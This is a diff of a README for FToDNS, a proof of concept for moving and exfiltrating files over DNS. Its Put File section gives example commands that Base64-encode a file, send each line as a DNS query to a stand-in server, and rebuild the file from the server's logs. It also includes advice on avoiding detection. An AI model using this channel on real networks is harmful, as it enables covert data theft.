@@ -5,45 +5,53 @@ Christopher Neitzert <chris@neitzert.com>
 
 ## What:
 A Proof of Concept that utilizes the Domain Name Service protocol, loosely, as it was intended for data delivery and 
-exfiltration across network boundaries limited  function on any standard Linux distribution with standard GNU Core utils and ISC's Bind9.
+exfiltration across network boundaries with functionality on any standard Linux distribution with standard GNU Core utils and ISC's Bind9.
 
 
 ## Why:
 This primarily is an intellectual exercise relating to practical information security in a networked environment.
 
-The use of DNS for data exfiltration or VPN has been a hacker trope for the nearly four decades that DNS has existed. 
+The use of DNS for data exfiltration or VPN has been a hacker trope for the nearly four decades that DNS has existed.  
+There have been several impliementations of this concept and this Proof of Concept is not unique. 
 The recent introduction of [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) takes an already incendiary security issue and douses it with petroleum.
 
 This PoC is meant to be seen as your drunken neighbor playing with fireworks far too close for comfort.
 
-There have been several impliementations of this concept and this Proof of Concept is not unique. 
+
 Although this implementation is not based on the previous PoCs, several interesting methods will be linked in the [Erratum.txt](https://github.com/neitzert/FToDNS/blob/master/Erratum.txt)
 
 ---
 
 ## How it works
-Given the multitude of ways DNS can be integrated into an infrastructure we will describe the PoC in two ways; Landscape and Verbs. 
+Given the multitude of ways DNS can be integrated into an infrastructure we will describe the PoC in three high level and generic terms; Type, Landscape and Verbs. 
 
 
-There are two generic types of 'Landscape' that DNS servers exists in, 'Direct' and 'Recursive'. 
-From the perspective of bad actor in the PoC a recursive server is just another hop in the communication.
+There are two generic types of 'Landscape' that DNS servers exists in, 'Direct Client to Server' and 'Client to Recursive Server to Authoritative' (AKA: Recursive). 
+From the perspective of bad actor in the PoC the a recursive landscape contains additional hops in the communication flow from client to server.
 
-Additionally, there are two 'verbs' that happen in a basic file transfer; We will call them 'Put File' and 'Get file'.
+The two 'Verbs' that happen in a basic file transfer; We will call them 'Put File' and 'Get file'. 
+Where to put a file is to copy towards and to get a file is to copy from other systems.
 
 
+### Types
 
-
+![TYPES of System](/images/FToDNS_Types.png)
+The three types of system operating within this PoC.
+* Authoritative DNS Server:  A DNS server that behaves as though it is an authoritative resource of Domain Name information.
+* Recursive DNS Server: A DNS server that is not an authoritative resource of Domain Name infomration, but retreives it for the DNS Client.
+* DNS Client: The resolver that queries the Domain Name Service to resolve addresses.
+ 
 ### Landscape:
 
 #### Direct Client to Server
-![DNS](/images/DNS_Generic.png)
+![Generic DNS](/images/DNS_Generic.png)
 * A typical DNS client queries a DNS server for a host or zone.
 * It might traverse a firewall or two as it crosses the internet
 * The DNS server responds to the DNS client with an answer or error
 
 
 #### Client to Recursive Server to Authoritative Server
-![DNS](/images/DNS_Recursion.png)
+![Client to Recursive to SOA DNS](/images/DNS_Recursion.png)
 * A typical DNS client queries a DNS server for a host or zone.
 * Local rules might require the DNS client use a local server.
 * The Local Server likely does not have the zone, so it queries the Authoritative Server on behalf of the DNS client.
@@ -55,7 +63,6 @@ Additionally, there are two 'verbs' that happen in a basic file transfer; We wil
 
 ### Verbs
 
-
 #### Put File
 ![DNS](/images/FToDNS_PutFile.png)
 * The user chooses a file and Base64 encodes the file with 56 Byte long lines
@@ -66,9 +73,13 @@ Additionally, there are two 'verbs' that happen in a basic file transfer; We wil
 		* ex: 
 			* host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1 
 		* Detection avoidance considerations should be taken around timing, encoding, destination servers, and host call.
+	* The query is not required to exist on the Authoritative DNS server to be logged at the Authoritative DNS server. 
+		* ex: 
+			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
 	* Each query is logged by the destination DNS Server and easily extracted by the inverse method of it's encoding.
 		* ex: 
 			* cat $NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
+ 
 
 
 
